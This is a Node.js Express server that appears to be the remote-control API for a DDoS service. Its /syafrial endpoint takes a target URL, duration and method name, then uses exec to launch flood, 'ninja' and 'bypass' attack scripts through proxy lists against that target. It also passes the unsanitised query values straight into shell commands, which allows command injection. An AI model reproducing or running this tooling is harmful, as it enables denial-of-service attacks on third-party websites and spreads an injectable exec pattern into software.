const express = require('express');
const { exec } = require('child_process');
const url = require('url');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;
async function fetchData() {
const response = await fetch('https://httpbin.org/get');
const data = await response.json();
console.log(`http://${data.origin}:${port}`);
return data
}

app.get('/syafrial', (req, res) => {
  const { target, time, methods } = req.query;
  const sikat = new url.URL(target);
  const slurp = sikat.hostname
res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });


if (methods === 'flood') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/flood.js ${target} ${time} 4 8 proxy.txt`)
        } else if (methods === 'ninja') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/ninja.js ${target} ${time}`)
        } else if (methods === 'proxy') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/SCRAPE.js`)
        } else if (methods === 'bypass') {
	console.log(`didos gaada rasa??`)
    exec(`node ./lib/cache/bypass.js ${target} ${time} 8 4 proxy.txt`)


} else {}
});
app.listen(port, () => {
fetchData()
});
